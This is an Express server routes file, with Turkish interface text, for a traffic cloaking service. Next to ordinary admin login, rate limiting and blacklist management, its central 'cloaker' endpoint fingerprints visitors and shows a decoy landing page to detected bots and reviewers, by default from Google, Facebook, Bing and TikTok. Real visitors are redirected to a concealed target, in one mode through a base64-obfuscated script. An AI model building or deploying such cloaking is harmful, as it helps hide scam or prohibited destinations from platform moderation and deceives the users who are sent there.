import type { Express, Request, Response, NextFunction } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "../shared/routes";
import { detectBot } from "./lib/detector";
import { db, pool } from "./db";
import { users } from "../shared/schema";
import { eq } from "drizzle-orm";
import bcrypt from "bcryptjs";
import { wsManager } from "./websocket";
import {
  clamp,
  escapeHtmlAttribute,
  getTrustedClientIp,
  isValidIpOrCidr,
  normalizeUaPatternInput,
  isSafeHttpUrl,
  parsePositiveInt,
  sanitizeHeadersForLogs,
} from "./security";

// === LOGIN RATE LIMITING ===
const loginAttemptsFallback = new Map<string, { count: number; lastAttempt: number; lockedUntil: number }>();
const MAX_LOGIN_ATTEMPTS = 5;
const LOCK_DURATION = 15 * 60 * 1000;
const ATTEMPT_WINDOW = 5 * 60 * 1000;
let loginAttemptTableInitialized = false;

const LOGIN_ATTEMPTS_TABLE_SQL = `
  CREATE TABLE IF NOT EXISTS login_attempts (
    ip_address TEXT PRIMARY KEY,
    attempt_count INTEGER NOT NULL DEFAULT 0,
    last_attempt TIMESTAMP NOT NULL DEFAULT NOW(),
    locked_until TIMESTAMP
  );
  CREATE INDEX IF NOT EXISTS idx_login_attempts_locked ON login_attempts(locked_until);
`;

async function ensureLoginAttemptsTable(): Promise<void> {
  if (loginAttemptTableInitialized) return;
  await pool.query(LOGIN_ATTEMPTS_TABLE_SQL);
  loginAttemptTableInitialized = true;
}

// Periyodik temizlik - bellek sızıntısını önle
setInterval(() => {
  const now = Date.now();
  loginAttemptsFallback.forEach((record, ip) => {
    if (now - record.lastAttempt > ATTEMPT_WINDOW && record.lockedUntil < now) {
      loginAttemptsFallback.delete(ip);
    }
  });
}, 10 * 60 * 1000); // Her 10 dakikada bir

function checkLoginRateLimitFallback(ip: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = loginAttemptsFallback.get(ip);
  if (!record) return { allowed: true };
  if (record.lockedUntil > now) return { allowed: false, retryAfter: Math.ceil((record.lockedUntil - now) / 1000) };
  if (now - record.lastAttempt > ATTEMPT_WINDOW) { loginAttemptsFallback.delete(ip); return { allowed: true }; }
  return { allowed: record.count < MAX_LOGIN_ATTEMPTS };
}

function recordLoginAttemptFallback(ip: string, success: boolean): void {
  if (success) { loginAttemptsFallback.delete(ip); return; }
  const now = Date.now();
  const record = loginAttemptsFallback.get(ip) || { count: 0, lastAttempt: now, lockedUntil: 0 };
  record.count++;
  record.lastAttempt = now;
  if (record.count >= MAX_LOGIN_ATTEMPTS) record.lockedUntil = now + LOCK_DURATION;
  loginAttemptsFallback.set(ip, record);
}

async function checkLoginRateLimit(ip: string): Promise<{ allowed: boolean; retryAfter?: number }> {
  const now = Date.now();
  try {
    await ensureLoginAttemptsTable();
    const result = await pool.query<{
      attempt_count: number;
      last_attempt: Date;
      locked_until: Date | null;
    }>(
      "SELECT attempt_count, last_attempt, locked_until FROM login_attempts WHERE ip_address = $1",
      [ip],
    );

    const record = result.rows[0];
    if (!record) return { allowed: true };

    const lockedUntilMs = record.locked_until ? new Date(record.locked_until).getTime() : 0;
    if (lockedUntilMs > now) {
      return { allowed: false, retryAfter: Math.ceil((lockedUntilMs - now) / 1000) };
    }

    const lastAttemptMs = new Date(record.last_attempt).getTime();
    if (now - lastAttemptMs > ATTEMPT_WINDOW) {
      await pool.query("DELETE FROM login_attempts WHERE ip_address = $1", [ip]);
      return { allowed: true };
    }

    return { allowed: record.attempt_count < MAX_LOGIN_ATTEMPTS };
  } catch (error) {
    console.error("[login-rate-limit] falling back to memory:", error);
    return checkLoginRateLimitFallback(ip);
  }
}

async function recordLoginAttempt(ip: string, success: boolean): Promise<void> {
  const now = Date.now();
  try {
    await ensureLoginAttemptsTable();
    if (success) {
      await pool.query("DELETE FROM login_attempts WHERE ip_address = $1", [ip]);
      return;
    }

    const result = await pool.query<{
      attempt_count: number;
      last_attempt: Date;
    }>(
      "SELECT attempt_count, last_attempt FROM login_attempts WHERE ip_address = $1",
      [ip],
    );
    const existing = result.rows[0];

    let nextCount = 1;
    if (existing) {
      const lastAttemptMs = new Date(existing.last_attempt).getTime();
      const stale = now - lastAttemptMs > ATTEMPT_WINDOW;
      nextCount = stale ? 1 : existing.attempt_count + 1;
    }

    const lockedUntil = nextCount >= MAX_LOGIN_ATTEMPTS
      ? new Date(now + LOCK_DURATION)
      : null;

    await pool.query(
      `
        INSERT INTO login_attempts (ip_address, attempt_count, last_attempt, locked_until)
        VALUES ($1, $2, NOW(), $3)
        ON CONFLICT (ip_address)
        DO UPDATE SET
          attempt_count = EXCLUDED.attempt_count,
          last_attempt = EXCLUDED.last_attempt,
          locked_until = EXCLUDED.locked_until
      `,
      [ip, nextCount, lockedUntil],
    );
  } catch (error) {
    console.error("[login-rate-limit] failed to persist attempt:", error);
    recordLoginAttemptFallback(ip, success);
  }
}

// === AUTH MIDDLEWARE ===
function requireAuth(req: Request, res: Response, next: NextFunction): void {
  const userId = req.session.userId;
  if (typeof userId !== "number" || !Number.isInteger(userId) || userId < 1) {
    res.status(401).json({ message: "Yetkisiz erişim" });
    return;
  }
  next();
}

// === MAINTENANCE PAGE ===
const MAINTENANCE_HTML = `<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bakım Modu</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { min-height: 100vh; background: #09090b; display: flex; align-items: center; justify-content: center; font-family: system-ui, sans-serif; color: #fafafa; overflow: hidden; }
    .container { text-align: center; padding: 2rem; max-width: 500px; }
    .icon { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #22c55e20, #10b98120); border: 1px solid #22c55e40; display: flex; align-items: center; justify-content: center; margin: 0 auto 2rem; animation: pulse 3s ease-in-out infinite; }
    .icon svg { width: 40px; height: 40px; color: #22c55e; }
    @keyframes pulse { 0%, 100% { box-shadow: 0 0 0 0 #22c55e30; } 50% { box-shadow: 0 0 0 20px #22c55e00; } }
    h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 0.75rem; background: linear-gradient(135deg, #22c55e, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    p { color: #a1a1aa; font-size: 0.95rem; line-height: 1.6; margin-bottom: 1rem; }
    .status { display: inline-flex; align-items: center; gap: 0.5rem; background: #22c55e15; border: 1px solid #22c55e30; border-radius: 999px; padding: 0.5rem 1.25rem; font-size: 0.8rem; color: #22c55e; margin-top: 1rem; }
    .dot { width: 6px; height: 6px; border-radius: 50%; background: #22c55e; animation: blink 1.5s ease-in-out infinite; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(#ffffff06 1px, transparent 1px), linear-gradient(90deg, #ffffff06 1px, transparent 1px); background-size: 50px 50px; z-index: -1; }
  </style>
</head>
<body>
  <div class="bg-grid"></div>
  <div class="container">
    <div class="icon">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" d="M11.42 15.17L17.25 21A2.652 2.652 0 0021 17.25l-5.877-5.877M11.42 15.17l2.496-3.03c.317-.384.74-.626 1.208-.766M11.42 15.17l-4.655 5.653a2.548 2.548 0 11-3.586-3.586l6.837-5.63m5.108-.233c.55-.164 1.163-.188 1.743-.14a4.5 4.5 0 004.486-6.336l-3.276 3.277a3.004 3.004 0 01-2.25-2.25l3.276-3.276a4.5 4.5 0 00-6.336 4.486c.091 1.076-.071 2.264-.904 2.95l-.102.085" />
      </svg>
    </div>
    <h1>Bakım Çalışması</h1>
    <p>Sitemiz şu anda planlı bakım çalışması nedeniyle geçici olarak hizmet dışıdır.</p>
    <div class="status"><span class="dot"></span>Bakım devam ediyor</div>
  </div>
</body>
</html>`;

// === HELPER FUNCTIONS ===
function getClientIp(req: Request): string {
  return getTrustedClientIp(req);
}

function getValidIdOrSendError(res: Response, raw: unknown): number | null {
  const id = parsePositiveInt(raw);
  if (!id) {
    res.status(400).json({ message: "Geçersiz ID" });
    return null;
  }
  return id;
}

function parseBoundedNumber(raw: unknown, fallback: number, min: number, max: number): number {
  const parsed = Number.parseInt(String(raw ?? ""), 10);
  if (!Number.isFinite(parsed)) return fallback;
  return clamp(parsed, min, max);
}

function parseSince(raw: unknown): Date {
  const parsed = new Date(String(raw ?? ""));
  if (!Number.isFinite(parsed.getTime())) {
    return new Date(Date.now() - 30_000);
  }
  return parsed;
}

export async function registerRoutes(httpServer: Server, app: Express): Promise<Server> {

  // === SEED ADMIN ===
  (async () => {
    try {
      const admin = await storage.getUserByUsername("admin");
      const configuredAdminPassword = process.env.ADMIN_PASSWORD?.trim();

      if (!admin && !configuredAdminPassword) {
        console.warn("[seed-admin] ADMIN_PASSWORD is not set; admin auto-seed skipped.");
        return;
      }

      if (!admin && configuredAdminPassword) {
        const hashedPassword = await bcrypt.hash(configuredAdminPassword, 12);
        await db.insert(users).values({ username: "admin", password: hashedPassword, email: "admin@boss.local" });
        console.log("[seed-admin] Admin account created.");
      } else if (admin && configuredAdminPassword) {
        const hashedPassword = await bcrypt.hash(configuredAdminPassword, 12);
        await db.update(users).set({ password: hashedPassword }).where(eq(users.id, admin.id));
        console.log("[seed-admin] Admin password synced.");
      }
    } catch (e) {
      console.error("Seeding error:", e);
    }
  })();

  // === PUBLIC ROUTES ===
  app.get("/maintenance", (_req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(MAINTENANCE_HTML);
  });

  // === AUTH ===
  app.post(api.auth.login.path, async (req, res) => {
    try {
      const ip = getClientIp(req);
      const rateCheck = await checkLoginRateLimit(ip);
      if (!rateCheck.allowed) {
        return res.status(429).json({
          message: `Çok fazla giriş denemesi. ${rateCheck.retryAfter ?? 60}s sonra deneyin.`,
        });
      }
      const { username, password } = api.auth.login.input.parse(req.body);
      const user = await storage.getUserByUsername(username);
      if (!user || !(await bcrypt.compare(password, user.password))) {
        await recordLoginAttempt(ip, false);
        return res.status(401).json({ message: "Geçersiz kullanıcı adı veya şifre" });
      }
      await recordLoginAttempt(ip, true);
      await new Promise<void>((resolve, reject) => {
        req.session.regenerate((err) => {
          if (err) reject(err);
          else resolve();
        });
      });
      req.session.userId = user.id;
      req.session.username = user.username;
      await new Promise<void>((resolve, reject) => {
        req.session.save((err) => {
          if (err) reject(err);
          else resolve();
        });
      });
      const { password: _, ...safeUser } = user;
      res.json(safeUser);
    } catch (error: any) {
      console.error("[auth/login]", error?.message || error);
      const msg = String(error?.message || "");
      if (msg.includes("does not exist") || msg.includes("relation")) {
        return res.status(503).json({
          message: "Database schema is not initialized. Run `npm run db:push` with your production DATABASE_URL.",
        });
      }
      return res.status(500).json({ message: "Login failed" });
    }
  });

  app.get(api.auth.me.path, async (req, res) => {
    if (!req.session.userId) return res.status(401).json({ message: "Not authenticated" });
    const user = await storage.getUser(req.session.userId);
    if (!user) { req.session.destroy(() => {}); return res.status(401).json({ message: "User not found" }); }
    const { password: _, ...safeUser } = user;
    res.json(safeUser);
  });

  app.post(api.auth.logout.path, (req, res) => {
    req.session.destroy((err) => {
      if (err) return res.status(500).json({ message: "Logout failed" });
      res.clearCookie("__sid", {
        httpOnly: true,
        sameSite: "strict",
        secure:
          process.env.NODE_ENV === "production" &&
          process.env.FORCE_INSECURE_COOKIE !== "true",
      });
      res.json({ message: "Logged out" });
    });
  });

  // === CLOAKER ENGINE ===
  const showLandingPage = async (res: any, domain: any, ip: string, ua: string, reason: string, score = 0, clickId?: string) => {
    const page = domain.landingPageId
      ? await storage.getLandingPage(domain.landingPageId)
      : undefined;
    const log = await storage.createAccessLog({
      domainId: domain.id, ipAddress: ip, userAgent: ua,
      isBot: true, botScore: score, botReasons: JSON.stringify([reason]),
      destination: 'landing', clickId, headers: '{}'
    });
    await storage.incrementDomainClicks(domain.id, true);
    
    // Canlı akış broadcast
    wsManager.broadcastLog({ ...log, domain: domain.domain });
    wsManager.broadcastDomainClick(domain.id, true);
    
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.send(page?.htmlContent || '<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>');
  };

  const performRedirect = (res: any, targetUrl: string, mode: string) => {
    const normalizedTarget = (targetUrl || "").trim();
    if (!isSafeHttpUrl(normalizedTarget)) {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      return res.status(400).send(
        "<!DOCTYPE html><html><body><h1>Invalid redirect URL</h1></body></html>",
      );
    }

    const escapedTarget = escapeHtmlAttribute(normalizedTarget);
    const encodedTarget = Buffer.from(normalizedTarget).toString("base64");

    switch (mode) {
      case 'meta':
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(`<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${escapedTarget}"><title>Redirecting...</title></head><body></body></html>`);
      case 'js':
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(`<!DOCTYPE html><html><head><title>Loading...</title></head><body><script>(function(){var u=atob("${encodedTarget}");setTimeout(function(){window.location.href=u;},100);})()</script></body></html>`);
      default:
        return res.redirect(302, normalizedTarget);
    }
  };

  const isWithinActiveHours = (activeHours: string | null, activeDays: string | null, timezone: string | null): boolean => {
    if (!activeHours && !activeDays) return true;
    const tz = timezone || 'Europe/Istanbul';
    try {
      const formatter = new Intl.DateTimeFormat('en-US', {
        timeZone: tz, weekday: 'short', hour: 'numeric', minute: 'numeric', hour12: false
      });
      const parts = formatter.formatToParts(new Date());
      const weekday = parts.find(p => p.type === 'weekday')?.value || 'Mon';
      const hour = parseInt(parts.find(p => p.type === 'hour')?.value || '0');
      const minute = parseInt(parts.find(p => p.type === 'minute')?.value || '0');
      const dayMap: Record<string, number> = { Sun: 7, Mon: 1, Tue: 2, Wed: 3, Thu: 4, Fri: 5, Sat: 6 };
      const currentDay = dayMap[weekday] || 1;
      const currentTime = hour * 60 + minute;
      
      if (activeDays) {
        const days = activeDays.split(',').map(d => parseInt(d.trim()));
        if (!days.includes(currentDay)) return false;
      }
      if (activeHours) {
        const [start, end] = activeHours.split('-');
        if (start && end) {
          const [sH, sM] = start.split(':').map(n => parseInt(n));
          const [eH, eM] = end.split(':').map(n => parseInt(n));
          if (currentTime < sH * 60 + (sM || 0) || currentTime > eH * 60 + (eM || 0)) return false;
        }
      }
    } catch { /* fallback: allow */ }
    return true;
  };

  // Main cloaker endpoint
  app.get(api.cloaker.check.path, async (req, res) => {
    try {
      const slug = req.params.slug;
      const domain = await storage.getDomainBySlug(slug);
      const ip = getClientIp(req);
      const userAgent = typeof req.headers["user-agent"] === "string" ? req.headers["user-agent"] : "";

      if (!domain) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send('<!DOCTYPE html><html><head><title>404</title></head><body><h1>Not Found</h1></body></html>');
      }

      if (!domain.redirectEnabled) {
        return showLandingPage(res, domain, ip, userAgent, 'REDIRECT_DISABLED');
      }

      if (await storage.isIpBlacklisted(ip)) {
        return showLandingPage(res, domain, ip, userAgent, 'IP_BLACKLISTED', 100);
      }

      if (await storage.isUaBlacklisted(userAgent)) {
        return showLandingPage(res, domain, ip, userAgent, 'UA_BLACKLISTED', 100);
      }

      if (!isWithinActiveHours(domain.activeHours, domain.activeDays, domain.timezone)) {
        return showLandingPage(res, domain, ip, userAgent, 'OUTSIDE_ACTIVE_HOURS');
      }

      const isMobile = /mobile|android|iphone|ipad|ipod|blackberry|windows phone/i.test(userAgent);
      if ((isMobile && !(domain.allowMobile ?? true)) || (!isMobile && !(domain.allowDesktop ?? true))) {
        return showLandingPage(res, domain, ip, userAgent, 'DEVICE_NOT_ALLOWED');
      }

      const maxClicks = domain.maxClicksPerIp ?? 0;
      const rateLimitWindow = domain.rateLimitWindow ?? 3600;
      if (maxClicks > 0 && !(await storage.checkRateLimit(domain.id, ip, maxClicks, rateLimitWindow))) {
        return showLandingPage(res, domain, ip, userAgent, 'RATE_LIMIT_EXCEEDED', 80);
      }

      const referer = typeof (req.headers['referer'] || req.headers['referrer'] || '') === 'string' 
        ? (req.headers['referer'] || req.headers['referrer'] || '').toString().trim() : '';

      // JS Challenge
      if (domain.jsChallenge) {
        const challengeToken = typeof req.query.vt === "string" ? req.query.vt : undefined;
        if (!challengeToken) {
          const newToken = await storage.createChallengeToken(domain.id, ip, userAgent);
          res.setHeader('Content-Type', 'text/html; charset=utf-8');
          return res.send(`<!DOCTYPE html><html><head><title>Verifying...</title>
<style>body{font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5;}
.loader{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head>
<body><div style="text-align:center"><div class="loader" style="margin:0 auto"></div><p>Verifying your browser...</p></div>
<script>(function(){var t="${newToken}";var c=new Date().getTimezoneOffset();var s=screen.width+"x"+screen.height;
var n=navigator.plugins?navigator.plugins.length:0;var d=window.devicePixelRatio||1;
setTimeout(function(){window.location.href=window.location.pathname+"?vt="+t+"&tz="+c+"&sr="+s+"&pl="+n+"&dpr="+d;},1200+Math.random()*800);
})()</script></body></html>`);
        }
        if (!(await storage.verifyChallengeToken(challengeToken, ip, domain.id, userAgent))) {
          return showLandingPage(res, domain, ip, userAgent, 'JS_CHALLENGE_FAILED', 90);
        }
      }

      // Bot detection
      const fullUrl = req.originalUrl || req.url;
      const detection = await detectBot(ip, userAgent, req.headers, fullUrl, {
        blockDirectAccess: domain.blockDirectAccess ?? false,
        blockedPlatforms: domain.blockedPlatforms ?? 'google,facebook,bing,tiktok',
        detectionLevel: domain.detectionLevel ?? 'high',
      });

      const log = await storage.createAccessLog({
        domainId: domain.id, ipAddress: ip, userAgent,
        referer: referer || null,
        isBot: detection.isBot, botScore: detection.score,
        botReasons: JSON.stringify(detection.reasons),
        destination: detection.isBot ? 'landing' : 'target',
        clickId: detection.clickId || null,
        headers: JSON.stringify(sanitizeHeadersForLogs(req.headers))
      });

      await storage.incrementDomainClicks(domain.id, detection.isBot);
      
      // Canlı akış broadcast
      wsManager.broadcastLog({ ...log, domain: domain.domain });
      wsManager.broadcastDomainClick(domain.id, detection.isBot);

      if (detection.isBot) {
        const page = domain.landingPageId
          ? await storage.getLandingPage(domain.landingPageId)
          : undefined;
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(page?.htmlContent || '<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>');
      }

      if (maxClicks > 0) {
        await storage.incrementRateLimit(domain.id, ip, rateLimitWindow);
      }

      return performRedirect(res, domain.targetUrl, domain.redirectMode || '302');
    } catch (e) {
      console.error('[cloaker]', e);
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.send('<h1>Error</h1>');
    }
  });

  // === LIVE POLLING ENDPOINT (WebSocket Fallback) ===
  app.get('/api/live/poll', requireAuth, async (req, res) => {
    try {
      const since = req.query.since ? parseSince(req.query.since) : new Date(Date.now() - 30000);
      const logs = await storage.getAccessLogsSince(since, 20);
      const stats = await storage.getStats();
      res.json({
        logs,
        stats,
        timestamp: new Date().toISOString(),
        wsAvailable: false,
      });
    } catch (e) {
      console.error('[poll]', e);
      res.status(500).json({ logs: [], stats: null, timestamp: new Date().toISOString() });
    }
  });

  // === PROTECTED ADMIN API ===

  app.post('/api/auth/change-password', requireAuth, async (req, res) => {
    try {
      const { currentPassword, newPassword } = req.body;
      if (!currentPassword || !newPassword) return res.status(400).json({ message: "Tüm alanlar gerekli" });
      if (typeof currentPassword !== "string" || typeof newPassword !== "string") {
        return res.status(400).json({ message: "Geçersiz şifre formatı" });
      }
      if (newPassword.length < 6 || newPassword.length > 128) {
        return res.status(400).json({ message: "Şifre 6-128 karakter olmalı" });
      }
      const user = await storage.getUser(req.session.userId!);
      if (!user || !(await bcrypt.compare(currentPassword, user.password))) {
        return res.status(401).json({ message: "Mevcut şifre yanlış" });
      }
      await storage.changePassword(user.id, await bcrypt.hash(newPassword, 12));
      res.json({ message: "Şifre değiştirildi" });
    } catch { res.status(500).json({ message: "Şifre değiştirilemedi" }); }
  });

  // Settings
  app.get('/api/settings', requireAuth, async (_req, res) => { res.json(await storage.getSettings()); });
  app.put('/api/settings', requireAuth, async (req, res) => {
    try {
      if (!req.body || typeof req.body !== 'object' || Array.isArray(req.body)) {
        return res.status(400).json({ message: "Geçersiz veri" });
      }

      const sanitizedEntries: Record<string, string> = {};
      for (const [key, rawValue] of Object.entries(req.body as Record<string, unknown>)) {
        if (!/^[a-z0-9_]{1,64}$/i.test(key)) continue;
        if (
          typeof rawValue !== "string" &&
          typeof rawValue !== "number" &&
          typeof rawValue !== "boolean"
        ) {
          continue;
        }
        sanitizedEntries[key] = String(rawValue).slice(0, 2048);
      }

      if (Object.keys(sanitizedEntries).length === 0) {
        return res.status(400).json({ message: "Kaydedilecek geçerli ayar bulunamadı" });
      }

      await storage.setSettings(sanitizedEntries);
      res.json({ message: "Ayarlar kaydedildi" });
    } catch { res.status(500).json({ message: "Ayarlar kaydedilemedi" }); }
  });

  // Log management
  app.delete('/api/logs/old', requireAuth, async (req, res) => {
    const days = parseBoundedNumber(req.query.days, 30, 1, 365);
    await storage.clearOldLogs(days);
    res.json({ message: `${days} günden eski loglar temizlendi` });
  });

  app.delete('/api/logs/all', requireAuth, async (_req, res) => {
    await storage.clearAllLogs();
    res.json({ message: "Tüm loglar temizlendi" });
  });

  app.post('/api/stats/reset', requireAuth, async (_req, res) => {
    await storage.resetStats();
    res.json({ message: "İstatistikler sıfırlandı" });
  });

  // Stats
  app.get(api.stats.dashboard.path, requireAuth, async (_req, res) => {
    const stats = await storage.getStats();
    const logs = await storage.getAccessLogs(10);
    res.json({ ...stats, recentLogs: logs });
  });

  // Domains
  app.get(api.domains.list.path, requireAuth, async (_req, res) => { res.json(await storage.getDomains()); });
  app.post(api.domains.create.path, requireAuth, async (req, res) => {
    const input = api.domains.create.input.parse(req.body);
    res.status(201).json(await storage.createDomain(input));
  });
  app.put(api.domains.update.path, requireAuth, async (req, res) => {
    const id = getValidIdOrSendError(res, req.params.id);
    if (!id) return;
    const input = api.domains.update.input.parse(req.body);
    res.json(await storage.updateDomain(id, input));
  });
  app.delete(api.domains.delete.path, requireAuth, async (req, res) => {
    const id = getValidIdOrSendError(res, req.params.id);
    if (!id) return;
    await storage.deleteDomain(id);
    res.status(204).end();
  });

  // Landing Pages
  app.get(api.landingPages.list.path, requireAuth, async (_req, res) => { res.json(await storage.getLandingPages()); });
  app.post(api.landingPages.create.path, requireAuth, async (req, res) => {
    const input = api.landingPages.create.input.parse(req.body);
    res.status(201).json(await storage.createLandingPage(input));
  });
  app.put(api.landingPages.update.path, requireAuth, async (req, res) => {
    const id = getValidIdOrSendError(res, req.params.id);
    if (!id) return;
    res.json(await storage.updateLandingPage(id, api.landingPages.update.input.parse(req.body)));
  });
  app.delete(api.landingPages.delete.path, requireAuth, async (req, res) => {
    const id = getValidIdOrSendError(res, req.params.id);
    if (!id) return;
    await storage.deleteLandingPage(id);
    res.status(204).end();
  });

  // Logs
  app.get(api.logs.list.path, requireAuth, async (req, res) => {
    const limit = parseBoundedNumber(req.query.limit, 100, 1, 500);
    res.json(await storage.getAccessLogs(limit));
  });

  // Blacklist
  app.get('/api/blacklist/ip', requireAuth, async (_req, res) => { res.json(await storage.getIpBlacklist()); });
  app.post('/api/blacklist/ip', requireAuth, async (req, res) => {
    const ip = typeof req.body?.ip === "string" ? req.body.ip.trim() : "";
    const reason = typeof req.body?.reason === "string" ? req.body.reason.trim().slice(0, 255) : undefined;
    if (!ip || !isValidIpOrCidr(ip)) {
      return res.status(400).json({ error: "Valid IP or CIDR required (e.g. 1.2.3.4 or 1.2.3.0/24)" });
    }
    res.status(201).json(await storage.addToIpBlacklist(ip, reason));
  });
  app.delete('/api/blacklist/ip/:id', requireAuth, async (req, res) => {
    const id = getValidIdOrSendError(res, req.params.id);
    if (!id) return;
    await storage.removeFromIpBlacklist(id);
    res.status(204).end();
  });

  app.get('/api/blacklist/ua', requireAuth, async (_req, res) => { res.json(await storage.getUaBlacklist()); });
  app.post('/api/blacklist/ua', requireAuth, async (req, res) => {
    const pattern = typeof req.body?.pattern === "string"
      ? normalizeUaPatternInput(req.body.pattern)
      : "";
    const reason = typeof req.body?.reason === "string" ? req.body.reason.trim().slice(0, 255) : undefined;
    if (!pattern || pattern.length > 128) {
      return res.status(400).json({ error: "Pattern must be 1-128 characters" });
    }
    res.status(201).json(await storage.addToUaBlacklist(pattern, reason));
  });
  app.delete('/api/blacklist/ua/:id', requireAuth, async (req, res) => {
    const id = getValidIdOrSendError(res, req.params.id);
    if (!id) return;
    await storage.removeFromUaBlacklist(id);
    res.status(204).end();
  });

  return httpServer;
}
